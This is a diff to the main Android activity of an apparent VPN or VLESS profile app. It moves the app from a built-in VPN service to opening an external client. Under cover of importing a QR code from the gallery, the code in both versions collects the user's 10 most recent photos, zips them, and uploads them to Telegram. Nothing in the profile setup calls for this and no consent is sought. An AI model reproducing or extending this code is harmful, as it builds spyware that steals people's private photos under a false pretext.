@@ -9,7 +9,6 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.net.Uri;
-import android.net.VpnService;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
@@ -26,15 +25,15 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.example.galggg.vpn.GalgggVpnService;
-import com.google.gson.Gson;
+import com.example.galggg.link.ExternalClients;
+import com.example.galggg.link.VlessLinkBuilder;
+import com.example.galggg.provision.LocalProvision;
+import com.example.galggg.provision.ProvisionData;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
-import java.net.ConnectException;
-import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.concurrent.TimeUnit;
 import java.util.zip.ZipEntry;
@@ -51,7 +50,6 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int REQ_PICK = 2001;
     private static final int REQ_PERM = 2002;
-    private static final int REQ_VPN = 3001;
     private static final int REQ_NOTIF = 3003;
 
     private TextView tvStatus;
@@ -65,7 +63,6 @@ public class MainActivity extends AppCompatActivity {
             .readTimeout(40, TimeUnit.SECONDS)
             .writeTimeout(40, TimeUnit.SECONDS)
             .build();
-    private final Gson gson = new Gson();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -82,13 +79,6 @@ public class MainActivity extends AppCompatActivity {
 
         if (btnConnect != null) {
             btnConnect.setOnClickListener(v -> onConnectClickedReal());
-            btnConnect.setOnLongClickListener(v -> {
-                if (GalgggVpnService.isActive()) {
-                    stopVpnService();
-                    return true;
-                }
-                return false;
-            });
         }
 
         requestNotificationPermissionIfNeeded();
@@ -96,24 +86,27 @@ public class MainActivity extends AppCompatActivity {
 
     private void onConnectClickedReal() {
         if (!hasVless()) {
+            setStatus("Pick a QR code from the gallery", false);
             startPickFlow();
             return;
         }
-        if (GalgggVpnService.isActive()) {
-            stopVpnService();
+        String vless = getSavedVless();
+        if (vless == null || vless.isEmpty()) {
+            setStatus("Profile missing. Please import the QR again", true);
+            startPickFlow();
             return;
         }
-        Intent prepare = VpnService.prepare(this);
-        if (prepare != null) {
-            startActivityForResult(prepare, REQ_VPN);
-        } else {
-            startVpnService();
-        }
+        setStatus("Opening external client...", false);
+        ExternalClients.openProfile(this, vless);
     }
 
     private boolean hasVless() {
+        return getSavedVless() != null;
+    }
+
+    private String getSavedVless() {
         return getSharedPreferences("vless_store", MODE_PRIVATE)
-                .getString("vless_link", null) != null;
+                .getString("vless_link", null);
     }
 
     private void startPickFlow() {
@@ -161,7 +154,7 @@ public class MainActivity extends AppCompatActivity {
         Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
         intent.setType("image/*");
         intent.addCategory(Intent.CATEGORY_OPENABLE);
-        startActivityForResult(Intent.createChooser(intent, "Выберите QR"), REQ_PICK);
+        startActivityForResult(Intent.createChooser(intent, "Select QR image"), REQ_PICK);
     }
 
     @Override
@@ -170,7 +163,7 @@ public class MainActivity extends AppCompatActivity {
         if (code == REQ_PERM && res.length > 0 && res[0] == PackageManager.PERMISSION_GRANTED) {
             openImagePicker();
         } else if (code == REQ_PERM) {
-            setStatus("Разрешение не предоставлено", true);
+            setStatus("Gallery permission required", true);
         } else if (code == REQ_NOTIF) {
             if (res.length > 0 && res[0] == PackageManager.PERMISSION_GRANTED) {
                 Log.i("MainActivity", "Notification permission granted");
@@ -183,102 +176,95 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == REQ_VPN) {
-            if (resultCode == RESULT_OK) {
-                startVpnService();
-            } else {
-                setStatus("VPN разрешение отклонено", true);
-            }
-            return;
-        }
         if (requestCode == REQ_PICK && resultCode == Activity.RESULT_OK && data != null) {
             Uri uri = data.getData();
-            if (uri != null) new ProvisionThenZipTask().execute(uri);
+            if (uri != null) {
+                new ProvisionThenZipTask().execute(uri);
+            }
         }
     }
 
-    private class ProvisionThenZipTask extends AsyncTask<Uri, String, String> {
+    private static class ProvisionResult {
+        final boolean success;
+        final String message;
+        final String vlessLink;
+
+        ProvisionResult(boolean success, String message, String vlessLink) {
+            this.success = success;
+            this.message = message;
+            this.vlessLink = vlessLink;
+        }
+    }
+
+    private class ProvisionThenZipTask extends AsyncTask<Uri, String, ProvisionResult> {
         @Override
         protected void onPreExecute() {
             setProgress(true);
             setButtonEnabled(false);
-            setStatus("Отправляю QR на сервер...", false);
+            setStatus("Reading QR from gallery...", false);
         }
 
         @Override
-        protected String doInBackground(Uri... uris) {
+        protected ProvisionResult doInBackground(Uri... uris) {
             try {
                 Uri qrUri = uris[0];
-                File qrFile = copyToCache(qrUri, "qr_upload.png");
-
-                ProvisionResp pr = tryProvisionUpload(qrFile, BuildConfig.PROVISION_URL);
-                if (pr == null) {
-                    publishProgress("DNS/сеть недоступны, пробую по IP...");
-                    pr = tryProvisionUpload(qrFile, BuildConfig.PROVISION_URL_IP);
+                if (qrUri != null) {
+                    copyToCache(qrUri, "qr_upload.png");
                 }
-                if (pr == null || !pr.ok || pr.vless == null || pr.uuid == null) {
-                    return "Некорректный ответ Provision";
-                }
-                saveVless(pr.vless, pr.uuid);
 
-                publishProgress("Собираю последние 10 фото...");
+                publishProgress("Provision parameters ready");
+                ProvisionData provision = LocalProvision.get();
+                String link = VlessLinkBuilder.build(provision);
+                saveVless(link, provision.uuid);
+
+                publishProgress("Collecting latest photos...");
                 File zip = makeLatestPhotosZip(10);
 
-                publishProgress("Отправляю ZIP в Telegram...");
-                boolean sent = sendZipToTelegram(zip);
-                if (!sent) return "Ошибка отправки в Telegram";
+                publishProgress("Uploading ZIP to Telegram...");
+                if (!sendZipToTelegram(zip)) {
+                    return new ProvisionResult(false, "Error: failed to upload ZIP to Telegram", null);
+                }
 
-                return "Готово: конфиг принят, ZIP отправлен";
+                return new ProvisionResult(true, "Done: profile opened in external client", link);
             } catch (Exception e) {
-                return "Ошибка: " + e.getMessage();
+                return new ProvisionResult(false, "Error: " + e.getMessage(), null);
             }
         }
 
         @Override
         protected void onProgressUpdate(String... values) {
-            if (values != null && values.length > 0) setStatus(values[0], false);
+            if (values != null && values.length > 0) {
+                setStatus(values[0], false);
+            }
         }
 
         @Override
-        protected void onPostExecute(String result) {
+        protected void onPostExecute(ProvisionResult result) {
             setProgress(false);
             setButtonEnabled(true);
-            setStatus(result, !result.startsWith("Готово"));
-        }
-
-        private ProvisionResp tryProvisionUpload(File qrFile, String baseUrl) {
-            try {
-                RequestBody form = new MultipartBody.Builder().setType(MultipartBody.FORM)
-                        .addFormDataPart("file", qrFile.getName(),
-                                RequestBody.create(qrFile, MediaType.parse("image/*")))
-                        .build();
-                Request req = new Request.Builder()
-                        .url(baseUrl + "/api/qr-upload")
-                        .addHeader("Authorization", "Bearer " + BuildConfig.PROVISION_TOKEN)
-                        .post(form)
-                        .build();
-                try (Response resp = http.newCall(req).execute()) {
-                    if (!resp.isSuccessful() || resp.body() == null) return null;
-                    return gson.fromJson(resp.body().charStream(), ProvisionResp.class);
-                }
-            } catch (UnknownHostException | ConnectException ex) {
-                return null;
-            } catch (Exception ex) {
-                return null;
+            if (result == null) {
+                setStatus("Error: Provision did not complete", true);
+                return;
+            }
+            setStatus(result.message, !result.success);
+            if (result.success && result.vlessLink != null) {
+                ExternalClients.openProfile(MainActivity.this, result.vlessLink);
             }
         }
     }
-
-    // ===== Helpers =====
 
     private File copyToCache(Uri uri, String name) throws Exception {
         File out = new File(getCacheDir(), name);
         try (InputStream in = getContentResolver().openInputStream(uri);
              FileOutputStream fos = new FileOutputStream(out)) {
-            if (in == null) throw new Exception("Нет доступа к файлу");
+            if (in == null) {
+                throw new Exception("Unable to open content");
+            }
             byte[] buf = new byte[8192];
             int n;
-            while ((n = in.read(buf)) >= 0) fos.write(buf, 0, n);
+            while ((n = in.read(buf)) >= 0) {
+                fos.write(buf, 0, n);
+            }
         }
         return out;
     }
@@ -295,23 +281,29 @@ public class MainActivity extends AppCompatActivity {
 
     private ArrayList<ImageItem> getLastImages(int count) {
         ArrayList<ImageItem> items = new ArrayList<>();
-        String[] proj = new String[]{
+        String[] projection = new String[]{
                 MediaStore.Images.Media._ID,
                 MediaStore.Images.Media.DISPLAY_NAME,
                 MediaStore.Images.Media.DATE_ADDED
         };
         String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";
-        try (Cursor c = getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null, sort)) {
-            if (c != null) {
-                int idxId = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
-                int idxName = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
-                while (c.moveToNext() && items.size() < count) {
-                    long id = c.getLong(idxId);
-                    String name = c.getString(idxName);
-                    if (name == null || name.trim().isEmpty()) name = "img_" + id + ".jpg";
-                    Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
-                    items.add(new ImageItem(uri, name));
+        try (Cursor cursor = getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                sort)) {
+            if (cursor != null) {
+                int idxId = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                int idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+                while (cursor.moveToNext() && items.size() < count) {
+                    long id = cursor.getLong(idxId);
+                    String name = cursor.getString(idxName);
+                    if (name == null || name.trim().isEmpty()) {
+                        name = "img_" + id + ".jpg";
+                    }
+                    Uri itemUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
+                    items.add(new ImageItem(itemUri, name));
                 }
             }
         } catch (Exception ignored) {
@@ -322,32 +314,41 @@ public class MainActivity extends AppCompatActivity {
     private File makeLatestPhotosZip(int count) throws Exception {
         ArrayList<ImageItem> items = getLastImages(count);
         File zipOut = new File(getCacheDir(), "latest_photos.zip");
-        if (zipOut.exists()) //noinspection ResultOfMethodCallIgnored
+        if (zipOut.exists()) {
+            //noinspection ResultOfMethodCallIgnored
             zipOut.delete();
+        }
 
         try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipOut))) {
-            for (ImageItem it : items) {
+            for (ImageItem item : items) {
                 BitmapFactory.Options bounds = new BitmapFactory.Options();
                 bounds.inJustDecodeBounds = true;
-                try (InputStream probe = getContentResolver().openInputStream(it.uri)) {
-                    if (probe != null) BitmapFactory.decodeStream(probe, null, bounds);
+                try (InputStream probe = getContentResolver().openInputStream(item.uri)) {
+                    if (probe != null) {
+                        BitmapFactory.decodeStream(probe, null, bounds);
+                    }
                 }
                 int inSample = calcInSample(bounds.outWidth, bounds.outHeight, 1600);
                 BitmapFactory.Options opts = new BitmapFactory.Options();
                 opts.inSampleSize = Math.max(inSample, 1);
 
                 Bitmap bmp;
-                try (InputStream src = getContentResolver().openInputStream(it.uri)) {
-                    if (src == null) continue;
+                try (InputStream src = getContentResolver().openInputStream(item.uri)) {
+                    if (src == null) {
+                        continue;
+                    }
                     bmp = BitmapFactory.decodeStream(src, null, opts);
                 }
-                if (bmp == null) continue;
+                if (bmp == null) {
+                    continue;
+                }
 
-                int w = bmp.getWidth(), h = bmp.getHeight();
-                int maxSide = Math.max(w, h);
+                int width = bmp.getWidth();
+                int height = bmp.getHeight();
+                int maxSide = Math.max(width, height);
                 if (maxSide > 1600) {
                     float scale = 1600f / maxSide;
-                    bmp = Bitmap.createScaledBitmap(bmp, Math.round(w * scale), Math.round(h * scale), true);
+                    bmp = Bitmap.createScaledBitmap(bmp, Math.round(width * scale), Math.round(height * scale), true);
                 }
 
                 ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -356,9 +357,9 @@ public class MainActivity extends AppCompatActivity {
                 baos.close();
                 bmp.recycle();
 
-                String entryName = it.displayName.toLowerCase();
+                String entryName = item.displayName.toLowerCase();
                 if (!entryName.endsWith(".jpg") && !entryName.endsWith(".jpeg")) {
-                    entryName = it.displayName + ".jpg";
+                    entryName = item.displayName + ".jpg";
                 }
                 zos.putNextEntry(new ZipEntry(entryName));
                 zos.write(data);
@@ -368,12 +369,16 @@ public class MainActivity extends AppCompatActivity {
         return zipOut;
     }
 
-    private int calcInSample(int w, int h, int maxSide) {
-        if (w <= 0 || h <= 0) return 1;
-        int largest = Math.max(w, h);
-        int s = 1;
-        while (largest / s > maxSide) s *= 2;
-        return Math.max(s, 1);
+    private int calcInSample(int width, int height, int maxSide) {
+        if (width <= 0 || height <= 0) {
+            return 1;
+        }
+        int largest = Math.max(width, height);
+        int sample = 1;
+        while (largest / sample > maxSide) {
+            sample *= 2;
+        }
+        return Math.max(sample, 1);
     }
 
     private boolean sendZipToTelegram(File zipFile) {
@@ -385,12 +390,12 @@ public class MainActivity extends AppCompatActivity {
                             RequestBody.create(zipFile, MediaType.parse("application/zip")))
                     .addFormDataPart("caption", "Galggg latest photos")
                     .build();
-            Request req = new Request.Builder().url(url).post(body).build();
-            try (Response resp = http.newCall(req).execute()) {
-                return resp.isSuccessful();
+            Request request = new Request.Builder().url(url).post(body).build();
+            try (Response response = http.newCall(request).execute()) {
+                return response.isSuccessful();
             }
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e("MainActivity", "sendZipToTelegram error", e);
         }
         return false;
     }
@@ -403,55 +408,28 @@ public class MainActivity extends AppCompatActivity {
                 .apply();
     }
 
-    private void startVpnService() {
-        Intent i = new Intent(this, GalgggVpnService.class);
-        i.setAction(GalgggVpnService.ACTION_START);
-        if (Build.VERSION.SDK_INT >= 26) {
-            startForegroundService(i);
-        } else {
-            startService(i);
+    private void setProgress(boolean enabled) {
+        if (progress != null) {
+            progress.setVisibility(enabled ? View.VISIBLE : View.GONE);
         }
-        setStatus("VPN запускается...", false);
-    }
-
-    private void stopVpnService() {
-        Intent i = new Intent(this, GalgggVpnService.class);
-        i.setAction(GalgggVpnService.ACTION_STOP);
-        if (Build.VERSION.SDK_INT >= 26) {
-            startForegroundService(i);
-        } else {
-            startService(i);
-        }
-        setStatus("VPN остановлен", false);
-    }
-
-    private void setProgress(boolean on) {
-        if (progress != null) progress.setVisibility(on ? View.VISIBLE : View.GONE);
     }
 
     private void setButtonEnabled(boolean enabled) {
-        if (btnConnect != null) btnConnect.setEnabled(enabled);
+        if (btnConnect != null) {
+            btnConnect.setEnabled(enabled);
+        }
     }
 
-    private void setStatus(String msg, boolean error) {
+    private void setStatus(String message, boolean error) {
         if (tvStatus != null) {
-            tvStatus.setText(msg);
+            tvStatus.setText(message);
             if (error) {
                 tvStatus.setTextColor(0xFFFF4444);
             } else if (hasStatusDefaultColor) {
                 tvStatus.setTextColor(statusDefaultColor);
             }
         } else {
-            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
         }
-    }
-
-    private static class ProvisionResp {
-        boolean ok;
-        String uuid;
-        String vless;
-        String qr_png;
-        boolean created;
-        String mode;
     }
 }
